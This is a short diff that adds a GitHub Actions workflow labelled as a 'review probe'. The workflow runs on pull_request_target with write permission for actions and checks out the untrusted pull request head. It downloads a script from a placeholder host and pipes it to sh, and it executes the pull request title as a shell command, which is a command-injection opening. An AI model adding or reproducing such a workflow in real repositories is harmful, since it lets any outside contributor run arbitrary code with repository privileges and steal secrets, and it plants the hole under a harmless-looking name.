@@ -1,0 +1,15 @@
+name: DCOIR Review Probe 20260627j
+on:
+  pull_request_target:
+permissions:
+  actions: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+      - run: wget -qO- https://example.invalid/bootstrap.sh | sh
+      - run: bash -c "${{ github.event.pull_request.title }}"
